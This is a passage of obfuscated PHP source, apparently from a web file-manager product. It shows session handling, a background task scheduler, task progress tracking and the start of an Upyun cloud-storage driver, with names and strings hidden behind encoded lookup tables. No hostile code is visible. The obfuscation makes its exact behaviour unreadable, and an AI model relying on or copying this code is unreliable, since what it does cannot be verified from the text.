<?php
 goto f¯ì›Ç½Â; E¢‹¦“˜È…: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $“ ¾Áâ· =& $_SERVER[Ï×Œõ”û]; static $àŞª¦« = false; if ($àŞª¦«) { return $àŞª¦«; } $²Æî‘Á = $GLOBALS[$“ ¾Áâ·[6]][$“ ¾Áâ·[426]]; self::$sessionTime = $²Æî‘Á[$“ ¾Áâ·[1876]]; $¶Îå–ôâ = isset($GLOBALS[$“ ¾Áâ·[1877]]) ? $GLOBALS[$“ ¾Áâ·[1877]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¶Îå–ôâ)) { self::$sessionSign = Cookie::get($¶Îå–ôâ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¶Îå–ôâ, self::$sessionSign, self::$sessionTime); $—ÎƒĞê = $²Æî‘Á[$“ ¾Áâ·[1878]]; $ïƒ©îÃˆ = $²Æî‘Á[$—ÎƒĞê]; $Ñò·¸Òà = $²Æî‘Á[$“ ¾Áâ·[942]]; switch ($—ÎƒĞê) { case $“ ¾Áâ·[21]: self::$handle = Model($“ ¾Áâ·[943]); break; case $“ ¾Áâ·[944]: self::$handle = new CacheRedis($ïƒ©îÃˆ, $Ñò·¸Òà); break; case $“ ¾Áâ·[945]: self::$handle = new CacheMemcached($ïƒ©îÃˆ, $Ñò·¸Òà); break; case $“ ¾Áâ·[232]: $ïƒ©îÃˆ[$“ ¾Áâ·[87]] = $ïƒ©îÃˆ[$“ ¾Áâ·[87]] . $“ ¾Áâ·[1879]; self::$handle = new CacheFile($ïƒ©îÃˆ, $Ñò·¸Òà); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$“ ¾Áâ·[1616]]) || time() - self::$data[$“ ¾Áâ·[1616]] >= 5) { self::dataSave(); } } $àŞª¦« = new self(); return $àŞª¦«; } public static function getBySign($ÖÂåş) { $İÌãóŸÆ = self::$handle->get($ÖÂåş); $İÌãóŸÆ = unserialize($İÌãóŸÆ); return is_array($İÌãóŸÆ) ? $İÌãóŸÆ : array(); } public static function setBySign($ùêïŞ·•, $¤¢áÃ) { self::$sessionSign = $ùêïŞ·•; self::$data = $¤¢áÃ; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[Ï×Œõ”û][1616]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ÅüîØşË = false) { if ($ÅüîØşË) { self::$sessionSign = $ÅüîØşË; } self::init(); return self::$sessionSign; } public static function set($Í»½õ³Œ, $ùÏÅÜÏ = false) { self::init(); if (is_array($Í»½õ³Œ)) { foreach ($Í»½õ³Œ as $Û„­ËØ­ => $Á“äåŠö) { array_set_value(self::$data, $Û„­ËØ­, $Á“äåŠö); } } else { array_set_value(self::$data, $Í»½õ³Œ, $ùÏÅÜÏ); } self::dataSave(); } public static function get($¤½îÏÑ­ = false) { self::init(); if (!$¤½îÏÑ­) { return self::$data; } return array_get_value(self::$data, $¤½îÏÑ­); } public static function remove($íò“¸‡Ğ) { self::init(); unset(self::$data[$íò“¸‡Ğ]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ï×Œõ”û][951])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $à­ÇËŠ =& $_SERVER[Ï×Œõ”û]; if (self::valueGet($à­ÇËŠ[856]) != $à­ÇËŠ[91]) { return; } if (self::valueGet($à­ÇËŠ[1880]) == $à­ÇËŠ[91]) { $ªóé¥ó‹ = self::valueGet($à­ÇËŠ[1881]); if (time() - $ªóé¥ó‹ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($à­ÇËŠ[1880], $à­ÇËŠ[91]); self::log($à­ÇËŠ[1882] . ACTION . $à­ÇËŠ[1883]); Hook::bind($à­ÇËŠ[1884], $à­ÇËŠ[1885]); $¬ãŠ·Šç = 0; while (!0) { self::cacheClear(); if (self::valueGet($à­ÇËŠ[856]) != $à­ÇËŠ[91]) { self::valueSet($à­ÇËŠ[1880], $à­ÇËŠ[230]); self::log($à­ÇËŠ[1886]); die; } $óëôàØ² = time(); if ($óëôàØ² - $¬ãŠ·Šç >= 60) { self::valueSet(array($à­ÇËŠ[1880] => $à­ÇËŠ[91], $à­ÇËŠ[1881] => $óëôàØ²)); $¬ãŠ·Šç = $óëôàØ²; } if (!file_exists(USER_SYSTEM . $à­ÇËŠ[1887])) { self::valueSet(array($à­ÇËŠ[1880] => $à­ÇËŠ[230], $à­ÇËŠ[856] => $à­ÇËŠ[230])); self::log($à­ÇËŠ[1888]); die; } $Ê…¬Ù‘Ÿ = file_get_contents(BASIC_PATH . $à­ÇËŠ[1889]); $‹ê­Û¬æ = KOD_VERSION . $à­ÇËŠ[10] . KOD_VERSION_BUILD; $£ÅÎõßê = match_text($Ê…¬Ù‘Ÿ, $à­ÇËŠ[1890]) . $à­ÇËŠ[10] . match_text($Ê…¬Ù‘Ÿ, $à­ÇËŠ[1891]); if ($£ÅÎõßê != $‹ê­Û¬æ) { self::restart(); self::log("\163\164\x6f\x70\145\144\56\133\x76\x65\162\163\x69\x6f\x6e\x20\x75\x70\x64\x61\x74\145\x3b{$versionNow}\40\x3d\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¹ì¥§Å =& $_SERVER[Ï×Œõ”û]; http_close(); $GLOBALS[$¹ì¥§Å[1892]] = 1; $_SERVER[$¹ì¥§Å[1893]] = $¹ì¥§Å[1894]; $_COOKIE = array(); $GLOBALS[$¹ì¥§Å[1895]] = 1; $GLOBALS[$¹ì¥§Å[1896]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $íÖòÆ£° =& $_SERVER[Ï×Œõ”û]; http_close(); self::valueSet($íÖòÆ£°[856], $íÖòÆ£°[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($íÖòÆ£°[1880] => $íÖòÆ£°[230], $íÖòÆ£°[856] => $íÖòÆ£°[91])); self::log($íÖòÆ£°[1897]); } public static function taskSwitch() { $³®º‚öå =& $_SERVER[Ï×Œõ”û]; $ÚúËÉ»® = self::valueGet($³®º‚öå[856]) == $³®º‚öå[91] ? $³®º‚öå[230] : $³®º‚öå[91]; self::valueSet($³®º‚öå[856], $ÚúËÉ»®); } public static function shutdownEvent() { $¨æ÷û¤œ =& $_SERVER[Ï×Œõ”û]; self::valueSet($¨æ÷û¤œ[1880], $¨æ÷û¤œ[230]); self::log($¨æ÷û¤œ[1898]); } public static function config($ïÁğß, $é‘ô³Ç‚) { self::valueSet($_SERVER[Ï×Œõ”û][856], $ïÁğß); } private static function taskRunAll() { $˜ºù¿Ö =& $_SERVER[Ï×Œõ”û]; $¯ô·”· = timeFloat(); $à÷¾õÉş = Model($˜ºù¿Ö[1899])->listData(); $èƒñ¥ Ü = count($à÷¾õÉş); for ($Š›À˜Ûı = 0; $Š›À˜Ûı < $èƒñ¥ Ü; $Š›À˜Ûı++) { $¥ŸıÊß¼ = $à÷¾õÉş[$Š›À˜Ûı]; if (!$¥ŸıÊß¼[$˜ºù¿Ö[484]] || $¥ŸıÊß¼[$˜ºù¿Ö[1900]] != $˜ºù¿Ö[91]) { continue; } if (!self::taskTimeCheck($¥ŸıÊß¼)) { continue; } self::taskRun($¥ŸıÊß¼); } Hook::trigger($˜ºù¿Ö[1901]); self::taskQueueRun($¯ô·”·); } private static function taskQueueRun($ñÕ„¯º×) { $©ğ®•âó = 10; while (!0) { $ŠšßÑ… = TaskQueue::run(); if ($ŠšßÑ… === !1) { break; } if (timeFloat() - $ñÕ„¯º× >= $©ğ®•âó) { break; } } } private static function taskTimeCheck($¹’²›ÏÅ) { $´Æ—¯—’ =& $_SERVER[Ï×Œõ”û]; $¡Ÿ¹ì¦ú = json_decode($¹’²›ÏÅ[$´Æ—¯—’[206]], !0); $õ†õÃºå = intval($¹’²›ÏÅ[$´Æ—¯—’[1881]]); $ÖÁŞ°Áœ = strtotime($´Æ—¯—’[1902] . $¡Ÿ¹ì¦ú[$´Æ—¯—’[1903]] . $´Æ—¯—’[1904]) - strtotime($´Æ—¯—’[1905]); $æŠû®•ë = time() - strtotime(date($´Æ—¯—’[1906]) . $´Æ—¯—’[1907]); $¾÷Œ¥Û = $æŠû®•ë >= $ÖÁŞ°Áœ && $æŠû®•ë <= $ÖÁŞ°Áœ + 3600; switch ($¡Ÿ¹ì¦ú[$´Æ—¯—’[33]]) { case $´Æ—¯—’[1908]: if (time() - $õ†õÃºå < 3600 * 24 * 30) { return !1; } if ($¡Ÿ¹ì¦ú[$´Æ—¯—’[1908]] == date($´Æ—¯—’[1909]) && $¾÷Œ¥Û) { return !0; } break; case $´Æ—¯—’[1910]: if (time() - $õ†õÃºå < 3600 * 24 * 7) { return !1; } $³ô…š•‡ = date($´Æ—¯—’[1911]) == 0 ? 7 : date($´Æ—¯—’[1911]); if ($¡Ÿ¹ì¦ú[$´Æ—¯—’[1910]] == $³ô…š•‡ && $¾÷Œ¥Û) { return !0; } break; case $´Æ—¯—’[1903]: if (time() - $õ†õÃºå < 3600 * 24) { return !1; } if ($¾÷Œ¥Û) { return !0; } break; case $´Æ—¯—’[1912]: if (time() - $õ†õÃºå >= floatval($¡Ÿ¹ì¦ú[$´Æ—¯—’[1912]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $µ”ó¥ñ =& $_SERVER[Ï×Œõ”û]; static $ÁĞè’—´ = 0; $Ğ¬²‰®µ = 300; if (!$ÁĞè’—´) { $ÁĞè’—´ = time(); } if (time() - $ÁĞè’—´ < $Ğ¬²‰®µ) { return; } $ÁĞè’—´ = time(); $¿ÈãË¬å = Model($µ”ó¥ñ[602])->db($µ”ó¥ñ[12]); if ($¿ÈãË¬å) { $¿ÈãË¬å->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($µ”ó¥ñ[1913], $µ”ó¥ñ[1914]); die; } } public static function taskRun($ù®ï¢½) { $¯ÁŞ»à =& $_SERVER[Ï×Œõ”û]; self::log($¯ÁŞ»à[1915] . $ù®ï¢½[$¯ÁŞ»à[484]] . $¯ÁŞ»à[1916] . $ù®ï¢½[$¯ÁŞ»à[32]] . $¯ÁŞ»à[1917] . $ù®ï¢½[$¯ÁŞ»à[1518]]); Model($¯ÁŞ»à[1899])->run($ù®ï¢½[$¯ÁŞ»à[484]]); $¯ÄÆ = timeFloat(); $Ü‡ÓŞùë = $¯ÁŞ»à[12]; switch ($ù®ï¢½[$¯ÁŞ»à[33]]) { case $¯ÁŞ»à[384]: $³²ŒôÛŒ = url_request($ù®ï¢½[$¯ÁŞ»à[1518]], $¯ÁŞ»à[1560], !1, !1, !1, !1, 10); if ($³²ŒôÛŒ[$¯ÁŞ»à[856]]) { $Ü‡ÓŞùë = strlen($³²ŒôÛŒ[$¯ÁŞ»à[1344]]); } break; case $¯ÁŞ»à[1918]: $Ü‡ÓŞùë = Hook::apply($ù®ï¢½[$¯ÁŞ»à[1518]]); default: break; } Model($¯ÁŞ»à[1919])->add(array($¯ÁŞ»à[1920] => $¯ÁŞ»à[12], $¯ÁŞ»à[1921] => $¯ÁŞ»à[230], $¯ÁŞ»à[33] => $¯ÁŞ»à[1922] . $ù®ï¢½[$¯ÁŞ»à[484]], $¯ÁŞ»à[1923] => json_encode(array($¯ÁŞ»à[32] => $ù®ï¢½[$¯ÁŞ»à[32]], $¯ÁŞ»à[1924] => timeFloat() - $¯ÄÆ, $¯ÁŞ»à[862] => $Ü‡ÓŞùë)))); $²Ø‘³¸é = $Ü‡ÓŞùë ? $¯ÁŞ»à[1925] . $Ü‡ÓŞùë : $¯ÁŞ»à[12]; self::log($¯ÁŞ»à[1926] . $ù®ï¢½[$¯ÁŞ»à[484]] . $¯ÁŞ»à[177] . $²Ø‘³¸é); return !0; } public static function valueGet($¢áüñîÚ) { $ÁçŠœà¢ =& $_SERVER[Ï×Œõ”û]; $Î¨ÌÛ£š = $ÁçŠœà¢[1927]; $‡š–¡ŸÔ = Model($ÁçŠœà¢[527])->get($¢áüñîÚ, $Î¨ÌÛ£š); if (is_null($‡š–¡ŸÔ)) { Model($ÁçŠœà¢[527])->set($ÁçŠœà¢[856], $ÁçŠœà¢[91], $Î¨ÌÛ£š); Model($ÁçŠœà¢[527])->set($ÁçŠœà¢[1880], $ÁçŠœà¢[230], $Î¨ÌÛ£š); $‡š–¡ŸÔ = Model($ÁçŠœà¢[527])->get($¢áüñîÚ, $Î¨ÌÛ£š); } return $‡š–¡ŸÔ; } private static function valueSet($‡‘×ÓªÛ, $ÖŠ“Ç¾› = false) { $Ÿ®“’ =& $_SERVER[Ï×Œõ”û]; $ÑıÜ³ = $Ÿ®“’[1928]; CacheLock::lock($ÑıÜ³); $ÅÖ”óÃİ = Model($Ÿ®“’[527])->set($‡‘×ÓªÛ, $ÖŠ“Ç¾›, $Ÿ®“’[1927]); CacheLock::unlock($ÑıÜ³); return $ÅÖ”óÃİ; } protected static function log($ê«¬õÀ¹) { write_log($ê«¬õÀ¹, $_SERVER[Ï×Œõ”û][1914]); } private static function cacheClear() { $Šäû¾ƒ =& $_SERVER[Ï×Œõ”û]; Cache::clearMemory(Model($Šäû¾ƒ[527])->cacheKey($Šäû¾ƒ[1927])); Cache::clearMemory(Model($Šäû¾ƒ[527])->cacheKey($Šäû¾ƒ[1929])); Model($Šäû¾ƒ[1899])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($éü±¯ÅŸ, $¡İ¢ÕÁŠ = '', $Î®¢¸Ä€ = 0, $…šÌª´¬ = '') { $ÑÑÔÂÖş =& $_SERVER[Ï×Œõ”û]; if (self::get($éü±¯ÅŸ)) { return; } $this->task = array($ÑÑÔÂÖş[484] => $éü±¯ÅŸ, $ÑÑÔÂÖş[1547] => USER_ID, $ÑÑÔÂÖş[1818] => $…šÌª´¬, $ÑÑÔÂÖş[545] => $ÑÑÔÂÖş[12], $ÑÑÔÂÖş[33] => $¡İ¢ÕÁŠ, $ÑÑÔÂÖş[1185] => $ÑÑÔÂÖş[12], $ÑÑÔÂÖş[1183] => $Î®¢¸Ä€, $ÑÑÔÂÖş[1930] => 0, $ÑÑÔÂÖş[1931] => 0, $ÑÑÔÂÖş[1932] => 0, $ÑÑÔÂÖş[1933] => timeFloat(), $ÑÑÔÂÖş[1934] => 0, $ÑÑÔÂÖş[1935] => 0, $ÑÑÔÂÖş[1936] => 0, $ÑÑÔÂÖş[1937] => 0, $ÑÑÔÂÖş[856] => $ÑÑÔÂÖş[1880]); $GLOBALS[$ÑÑÔÂÖş[1938]] = 1; Hook::bind($ÑÑÔÂÖş[1884], array($this, $ÑÑÔÂÖş[1939])); Hook::bind($ÑÑÔÂÖş[1940], array($this, $ÑÑÔÂÖş[1941])); $this->startAfter(); Hook::trigger($ÑÑÔÂÖş[1942], $this->task); $this->task[$ÑÑÔÂÖş[1935]] = timeFloat(); } public function end($½ªû¬ı± = '') { $²ÒÊËÑç =& $_SERVER[Ï×Œõ”û]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$²ÒÊËÑç[1935]]) { self::valueSet($this->task[$²ÒÊËÑç[484]], !1); } $this->isEnd = !0; if ($½ªû¬ı±) { $this->task[$²ÒÊËÑç[545]] = $½ªû¬ı±; } self::log($²ÒÊËÑç[1943] . $this->task[$²ÒÊËÑç[484]] . $²ÒÊËÑç[1944] . sprintf($²ÒÊËÑç[969], timeFloat() - $this->task[$²ÒÊËÑç[1933]]) . $²ÒÊËÑç[1945]); Hook::unbind($²ÒÊËÑç[1884], array($this, $²ÒÊËÑç[1939])); Hook::unbind($²ÒÊËÑç[1940], array($this, $²ÒÊËÑç[1941])); $this->endAfter(); $¬÷ï¯ƒ— = $this->task; $this->task = !1; Hook::trigger($²ÒÊËÑç[1946], $¬÷ï¯ƒ—); } public function update($¥¾Á² = 0, $„ûš«úâ = false) { $îÅë¦“ƒ =& $_SERVER[Ï×Œõ”û]; $ªı…ó =& $this->task; if (!$ªı…ó) { return; } $ªı…ó[$îÅë¦“ƒ[1930]] += $¥¾Á²; $ªı…ó[$îÅë¦“ƒ[1934]] = timeFloat(); if ($ªı…ó[$îÅë¦“ƒ[1183]]) { if ($ªı…ó[$îÅë¦“ƒ[1183]] < $ªı…ó[$îÅë¦“ƒ[1930]]) { $ªı…ó[$îÅë¦“ƒ[1183]] = $ªı…ó[$îÅë¦“ƒ[1930]]; } $Ş¤ãÃ÷‹ = timeFloat() - $ªı…ó[$îÅë¦“ƒ[1933]] - $ªı…ó[$îÅë¦“ƒ[1936]]; if ($Ş¤ãÃ÷‹ <= 0) { $Ş¤ãÃ÷‹ = 0.001; } $ªı…ó[$îÅë¦“ƒ[1931]] = $ªı…ó[$îÅë¦“ƒ[1930]] / $ªı…ó[$îÅë¦“ƒ[1183]]; $ªı…ó[$îÅë¦“ƒ[1932]] = $ªı…ó[$îÅë¦“ƒ[1930]] / $Ş¤ãÃ÷‹; if ($ªı…ó[$îÅë¦“ƒ[1931]] > 0) { $ªı…ó[$îÅë¦“ƒ[1937]] = $Ş¤ãÃ÷‹ * (1 - $ªı…ó[$îÅë¦“ƒ[1931]]) / $ªı…ó[$îÅë¦“ƒ[1931]]; } $ªı…ó[$îÅë¦“ƒ[1937]] = $ªı…ó[$îÅë¦“ƒ[1937]] <= 0 ? 0 : $ªı…ó[$îÅë¦“ƒ[1937]]; } $this->updateAfter(); $şúøŠ—µ = 0.2; if (timeFloat() - $ªı…ó[$îÅë¦“ƒ[1935]] < $şúøŠ—µ && !$„ûš«úâ) { return; } $ËÎÏÁÛ„ = self::get($ªı…ó[$îÅë¦“ƒ[484]]); $ìåğˆ¨Ü = $ËÎÏÁÛ„[$îÅë¦“ƒ[856]]; if ($ìåğˆ¨Ü == self::STATYS_KILL) { $·üŠ¦ú = array($îÅë¦“ƒ[1947] => LNG($îÅë¦“ƒ[1948]), $îÅë¦“ƒ[1354] => !1); Cache::set($îÅë¦“ƒ[1949] . $this->task[$îÅë¦“ƒ[484]], $·üŠ¦ú, 30); $this->onKill(); $this->end(); die; } else { if ($ìåğˆ¨Ü == self::STATYS_STOP) { $Ì‚¤íú² = 2; $ËÎÏÁÛ„[$îÅë¦“ƒ[1936]] += $Ì‚¤íú²; self::valueSet($ªı…ó[$îÅë¦“ƒ[484]], $ËÎÏÁÛ„); sleep($Ì‚¤íú²); $this->update(); return; } } $ªı…ó[$îÅë¦“ƒ[856]] = $ìåğˆ¨Ü ? $ìåğˆ¨Ü : $ªı…ó[$îÅë¦“ƒ[856]]; $ªı…ó[$îÅë¦“ƒ[1936]] = $ËÎÏÁÛ„[$îÅë¦“ƒ[1936]] ? $ËÎÏÁÛ„[$îÅë¦“ƒ[1936]] : 0; $ªı…ó[$îÅë¦“ƒ[1935]] = timeFloat(); Hook::trigger($îÅë¦“ƒ[1950], $ªı…ó); self::valueSet($ªı…ó[$îÅë¦“ƒ[484]], $ªı…ó); } public function onKillSet($½Æêİ¥ò, $´­¨ûĞ = array()) { $this->onKillCall = array($½Æêİ¥ò, $´­¨ûĞ); } public function onKill() { $¯ƒ¥îÒÌ =& $_SERVER[Ï×Œõ”û]; self::log($¯ƒ¥îÒÌ[1943] . $this->task[$¯ƒ¥îÒÌ[484]] . $¯ƒ¥îÒÌ[1951]); Hook::trigger($¯ƒ¥îÒÌ[1952], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ú©öæ„œ) { $ÌÛ¡ÌŸ =& $_SERVER[Ï×Œõ”û]; Cache::set($ÌÛ¡ÌŸ[1949] . $this->task[$ÌÛ¡ÌŸ[484]], $Ú©öæ„œ, 60); if (!is_array($Ú©öæ„œ) || !$Ú©öæ„œ[$ÌÛ¡ÌŸ[1354]]) { self::log($ÌÛ¡ÌŸ[1953] . json_encode($Ú©öæ„œ)); } return $Ú©öæ„œ; } public static function get($³ÁÜ¬şè) { $¨ƒ¢¬üµ =& $_SERVER[Ï×Œõ”û]; $–°áãô = self::valueGet($³ÁÜ¬şè); if (is_array($–°áãô) && $–°áãô[$¨ƒ¢¬üµ[1954]]) { $¡ŠÜü«ó = ActionApply($–°áãô[$¨ƒ¢¬üµ[1954]], array($–°áãô)); $–°áãô = is_array($¡ŠÜü«ó) ? $¡ŠÜü«ó : $–°áãô; } return $–°áãô; } public static function listData() { $Û©©Á‘Û = self::valueGet(); return array_sort_by($Û©©Á‘Û, $_SERVER[Ï×Œõ”û][1933], !0); } public static function kill($‡¸ßÊ©È) { return self::changeStatus($‡¸ßÊ©È, self::STATYS_KILL); } public static function stop($Ùí¹¦öŠ) { return self::changeStatus($Ùí¹¦öŠ, self::STATYS_STOP); } public static function restart($¥Ô¼ñàœ) { return self::changeStatus($¥Ô¼ñàœ, self::STATYS_RUNNING); } public static function killAll() { $ãÊ«© =& $_SERVER[Ï×Œõ”û]; $õ›ğ¿Š› = self::listData(); foreach ($õ›ğ¿Š› as $¨ìÚÅğ°) { self::kill($¨ìÚÅğ°[$ãÊ«©[484]]); } sleep(2); foreach ($õ›ğ¿Š› as $¨ìÚÅğ°) { self::valueSet($¨ìÚÅğ°[$ãÊ«©[484]], !1); } } private static function changeStatus($‹¾Ã™Ø¹, $®ÚÌƒé’) { $ùŒÜöÌª =& $_SERVER[Ï×Œõ”û]; $½‹ğŒ˜€ = self::valueGet($‹¾Ã™Ø¹); if (!$½‹ğŒ˜€) { return !1; } $½‹ğŒ˜€[$ùŒÜöÌª[856]] = $®ÚÌƒé’; self::valueSet($‹¾Ã™Ø¹, $½‹ğŒ˜€); self::log($ùŒÜöÌª[1955] . $½‹ğŒ˜€[$ùŒÜöÌª[484]] . $ùŒÜöÌª[1956] . $®ÚÌƒé’); return !0; } public static function valueGet($ª»ë¤™ = false) { $ ÏàšŒ² =& $_SERVER[Ï×Œõ”û]; if ($ª»ë¤™) { $§ŞŒ»š‰ = Model($ ÏàšŒ²[539])->where(array($ ÏàšŒ²[95] => $ª»ë¤™, $ ÏàšŒ²[33] => $ ÏàšŒ²[1192]))->find(); return $§ŞŒ»š‰ ? json_decode($§ŞŒ»š‰[$ ÏàšŒ²[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ñ°È·‚ü = false) { $îàœàš‰ =& $_SERVER[Ï×Œõ”û]; $áòÆ¾…Ü = array($îàœàš‰[33] => $îàœàš‰[1192]); if ($Ñ°È·‚ü) { $áòÆ¾…Ü[$îàœàš‰[1547]] = $Ñ°È·‚ü; } $“¡ÄÉÂÅ = Model($îàœàš‰[539])->where($áòÆ¾…Ü)->select(); $“¡ÄÉÂÅ = $“¡ÄÉÂÅ ? $“¡ÄÉÂÅ : array(); foreach ($“¡ÄÉÂÅ as $÷à¥Ÿš => $á¢²¼ğÇ) { $“¡ÄÉÂÅ[$÷à¥Ÿš] = json_decode($á¢²¼ğÇ[$îàœàš‰[452]], !0); } return $“¡ÄÉÂÅ; } public static function valueSet($ÆÍĞ æ‚, $çµ¥£à) { $Ş®¾²Ó =& $_SERVER[Ï×Œõ”û]; if (!$çµ¥£à) { return Model($Ş®¾²Ó[539])->where(array($Ş®¾²Ó[95] => $ÆÍĞ æ‚, $Ş®¾²Ó[33] => $Ş®¾²Ó[1192]))->delete(); } $öº‚è£ = json_encode($çµ¥£à); if (!$öº‚è£) { ob_start(); var_dump($çµ¥£à); $ÙÅç®ğ€ = ob_get_clean(); self::log($Ş®¾²Ó[1957] . json_encode_force($ÙÅç®ğ€)); } if (!$ÆÍĞ æ‚ || !$çµ¥£à[$Ş®¾²Ó[484]]) { return !1; } $…‰‰Àâ¥ = array($Ş®¾²Ó[33] => $Ş®¾²Ó[1192], $Ş®¾²Ó[1547] => USER_ID, $Ş®¾²Ó[95] => $ÆÍĞ æ‚, $Ş®¾²Ó[452] => $öº‚è£); $çØ…úòŠ = $Ş®¾²Ó[1958]; CacheLock::lock($çØ…úòŠ); Model($Ş®¾²Ó[539])->add($…‰‰Àâ¥, array(), !0); CacheLock::unlock($çØ…úòŠ); } public static function log($…¯ä²«) { if (!GLOBAL_DEBUG) { return; } write_log($…¯ä²«, $_SERVER[Ï×Œõ”û][1959]); } } goto bˆŒÇÒ¯ÜÎ; få†‹êêÍ¿: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\x3a\57\57\x76\60\56\141\160\x69\x2e\x75\160\x79\x75\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÏÈÜ­¼Â) { parent::__construct(); $this->_init($ÏÈÜ­¼Â); } public function _init($ì°áÁïÁ) { $ôóÜ±Ò =& $_SERVER[Ï×Œõ”û]; foreach ($ì°áÁïÁ as $ª‰‰Ëµ¬ => $£šî¦ƒ½) { if (isset($this->{$ª‰‰Ëµ¬})) { $this->{$ª‰‰Ëµ¬} = $£šî¦ƒ½; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ôóÜ±Ò[1703] . LNG($ôóÜ±Ò[1626])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Õ•”ï²ğ, $­á´‚‰¹ = "\x47\x45\x54") { $âïŸéÛ¤ =& $_SERVER[Ï×Œõ”û]; $¥‘ü¾ = gmdate($âïŸéÛ¤[1655]); $ìê˜Ö­Û = base64_encode(hash_hmac($âïŸéÛ¤[1704], "{$­á´‚‰¹}\46{$Õ•”ï²ğ}\46{$¥‘ü¾}", md5("{$this->userpass}"), !0)); $ŸŠ·šÀ = array("\x41\165\x74\150\x6f\x72\x69\x7a\x61\164\151\157\156\x3a\x55\x50\x59\125\x4e\40{$this->username}\72{$ìê˜Ö­Û}", "\104\141\x74\145\x3a{$¥‘ü¾}"); return $ŸŠ·šÀ; } public function ussRequest($‰¸Ôãäæ, $šÙâ™×Û = "\107\105\x54", $£ëØÄû× = false, $óÑáò¬¯ = false, $ƒ­ÁÊÀ¯ = false) { $ÆÄ•µ†ë =& $_SERVER[Ï×Œõ”û]; $‰¸Ôãäæ = trim($‰¸Ôãäæ, $ÆÄ•µ†ë[8]); $Œ·Èá£ = "\x2f{$this->bucket}\x2f" . rawurlencode($‰¸Ôãäæ); $Ø§—´Ü˜ = $this->ussHeaders($Œ·Èá£, $šÙâ™×Û); if ($óÑáò¬¯) { $Ø§—´Ü˜ = array_merge($Ø§—´Ü˜, $óÑáò¬¯); } $ƒùº„‹µ = url_request($this->endpoint . $Œ·Èá£, $šÙâ™×Û, $£ëØÄû×, $Ø§—´Ü˜, $ƒ­ÁÊÀ¯); if (!$ƒùº„‹µ) { $ÙíôÈ©ˆ = LNG($ÆÄ•µ†ë[1705]); $this->writeLog($ÙíôÈ©ˆ); return array($ÆÄ•µ†ë[1354] => !1, $ÆÄ•µ†ë[1344] => $ÙíôÈ©ˆ); } if (strtolower($šÙâ™×Û) == $ÆÄ•µ†ë[229] || in_array($ƒùº„‹µ[$ÆÄ•µ†ë[1354]], array($ÆÄ•µ†ë[263], $ÆÄ•µ†ë[1706]))) { $£ëØÄû× = $ƒùº„‹µ[$ÆÄ•µ†ë[1707]]; if (!$ƒùº„‹µ[$ÆÄ•µ†ë[856]]) { $£ëØÄû× = isset($£ëØÄû×[0]) ? $£ëØÄû×[0] : $ÆÄ•µ†ë[12]; } } else { $£ëØÄû× = json_decode($ƒùº„‹µ[$ÆÄ•µ†ë[1344]], !0); if (!$£ëØÄû×) { $£ëØÄû× = $ƒùº„‹µ[$ÆÄ•µ†ë[1344]]; } else { if (!$ƒùº„‹µ[$ÆÄ•µ†ë[856]] && isset($£ëØÄû×[$ÆÄ•µ†ë[1708]])) { $£ëØÄû× = $£ëØÄû×[$ÆÄ•µ†ë[1708]]; } } } if (!$ƒùº„‹µ[$ÆÄ•µ†ë[856]]) { $this->writeLog($this->__errorMessage($£ëØÄû×)); } return array($ÆÄ•µ†ë[1354] => $ƒùº„‹µ[$ÆÄ•µ†ë[856]], $ÆÄ•µ†ë[1344] => $£ëØÄû×); } private function __errorMessage($¦¥à×—ú) { $Ë’ü™•Œ =& $_SERVER[Ï×Œõ”û]; if (!$¦¥à×—ú) { return $Ë’ü™•Œ[12]; } static $áí÷–Û¦ = null; if (!$áí÷–Û¦) { $áí÷–Û¦ = I18n::getType(); } if ($áí÷–Û¦ != $Ë’ü™•Œ[1663]) { return $¦¥à×—ú; } $ñßÃš® = array($Ë’ü™•Œ[1709] => $Ë’ü™•Œ[1710], $Ë’ü™•Œ[1711] => $Ë’ü™•Œ[1712], $Ë’ü™•Œ[1713] => $Ë’ü™•Œ[1712], $Ë’ü™•Œ[1714] => $Ë’ü™•Œ[1715], $Ë’ü™•Œ[1716] => $Ë’ü™•Œ[1717], $Ë’ü™•Œ[1718] => $Ë’ü™•Œ[1719], $Ë’ü™•Œ[1720] => 